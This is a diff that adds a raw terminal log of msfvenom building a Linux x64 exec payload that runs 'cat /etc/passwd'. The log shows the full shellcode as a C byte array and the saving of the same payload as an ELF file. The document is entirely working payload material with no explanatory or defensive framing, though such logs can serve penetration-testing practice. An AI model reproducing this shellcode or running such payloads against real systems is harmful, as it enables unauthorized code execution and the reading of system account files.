@@ -1,0 +1,22 @@
+root@kali32:/opt/payload# msfvenom -p linux/x64/exec cmd='cat /etc/passwd' --platform linux -f c
+No Arch selected, selecting Arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 55 bytes
+Final size of c file: 256 bytes
+unsigned char buf[] =
+"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
+"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x10\x00"
+"\x00\x00\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73"
+"\x77\x64\x00\x56\x57\x48\x89\xe6\x0f\x05";
+root@kali32:/opt/payload#
+
+==
+
+root@kali32:/opt/payload# msfvenom -p linux/x64/exec cmd='cat /etc/passwd' --platform linux -f elf -o exec64
+No Arch selected, selecting Arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 55 bytes
+Final size of elf file: 175 bytes
+Saved as: exec64
+
+======
